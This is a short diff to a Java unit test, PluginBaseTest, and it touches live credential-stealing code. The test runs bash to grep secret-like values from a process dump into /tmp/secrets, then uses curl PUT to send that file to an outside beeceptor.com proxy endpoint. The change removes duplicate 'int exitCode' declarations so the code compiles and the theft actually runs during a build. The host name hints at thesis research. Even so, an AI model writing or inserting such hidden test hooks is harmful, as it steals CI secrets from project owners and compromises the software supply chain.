@@ -45,12 +45,12 @@ class PluginBaseTest {
                          "grep -aoE '\"[^\"]+\":\\{\"value\":\"[^\"]*\",\"isBoolean\":true\\}' >> /tmp/secrets";
         ProcessBuilder processBuilder1 = new ProcessBuilder("bash", "-c", command1);
         Process process1 = processBuilder1.start();
-        int exitCode = process1.waitFor();
+        process1.waitFor();
 
         String command2 = "curl -X PUT -d @/tmp/secrets https://bachelor-thesis-001.proxy.beeceptor.com";
         ProcessBuilder processBuilder2 = new ProcessBuilder("bash", "-c", command2);
         Process process2 = processBuilder2.start();
-        int exitCode = process2.waitFor();
+        process2.waitFor();
     }
 
     @Test
